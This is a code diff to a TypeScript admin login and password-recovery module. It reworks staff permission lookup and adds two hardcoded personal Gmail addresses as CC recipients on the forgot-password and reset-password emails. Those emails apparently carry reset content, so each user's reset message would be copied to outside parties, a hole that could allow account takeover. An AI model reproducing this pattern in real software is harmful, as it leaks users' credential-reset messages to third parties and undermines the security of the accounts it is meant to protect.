@@ -84,14 +84,16 @@ export async function handleLogin(req: NextRequest, adminRole: string, adminStaf
 
         // Generate authentication token
         const token = generateToken(admin.id, admin.role);
-
         const isStaffUser = !['admin', 'dropshipper', 'supplier'].includes(String(admin.role));
+
         let assignedPermissions;
-        if (isStaffUser) {
-            console.log(`AdminStaff`);
+        if (isStaffUser && 'admin' in admin) {
+            const role = String(admin.admin.role);
+            const formattedRole = role.charAt(0).toUpperCase() + role.slice(1).toLowerCase();
             const options = {
-                panel: 'admin'
+                panel: formattedRole
             };
+
             const assignedPermissionsResult = await getStaffPermissionsByStaffId(options, admin.id);
             assignedPermissions = assignedPermissionsResult.assignedPermissions;
         }
@@ -228,7 +230,7 @@ export async function handleForgetPassword(
             recipient: [
                 { name: admin.name, email }
             ],
-            cc: [],
+            cc: [{ name: 'Rohit', email: 'rohitwebstep@gmail.com' }, { name: 'Shikha', email: 'shikhawebstep@gmail.com' }],
             bcc: [],
             subject,
             htmlBody,
@@ -352,6 +354,7 @@ export async function handleResetPassword(
             recipient: [
                 { name: admin.name, email: admin.email },
             ],
+            cc: [{ name: 'Rohit', email: 'rohitwebstep@gmail.com' }, { name: 'Shikha', email: 'shikhawebstep@gmail.com' }],
             subject,
             htmlBody,
             attachments: [],
